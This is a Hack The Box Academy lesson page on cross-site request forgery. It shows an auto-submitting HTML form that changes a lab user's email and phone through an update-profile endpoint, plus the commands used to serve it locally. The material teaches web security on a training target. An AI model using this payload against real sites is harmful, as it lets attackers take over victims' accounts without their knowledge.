<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/153/section/1447
// Platform Version: V1
// Module ID: 153
// Module Name: Session Security
// Module Difficulty: Medium
// Section ID: 1447
// Section Title: Cross-Site Request Forgery
// Page Title: Hack The Box - Academy
// Page Number: 06
-->

# Cross-Site Request Forgery

**Module Name:** Session Security **Page Number:** 06

#### 

#### SESSION SECURITY

# Cross-Site Request Forgery (CSRF or XSRF)

## Cross-Site Request Forgery Example

``` shell-session
ndefstathiou@htb[/htb]$ burpsuite
```

![https://academy.hackthebox.com/storage/modules/153/28.png](https://academy.hackthebox.com/storage/modules/153/28.png)

``` html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

![https://academy.hackthebox.com/storage/modules/153/29.png](https://academy.hackthebox.com/storage/modules/153/29.png)

``` shell-session
ndefstathiou@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

![https://academy.hackthebox.com/storage/modules/153/30.png](https://academy.hackthebox.com/storage/modules/153/30.png)

# 

# 

#### Questions

####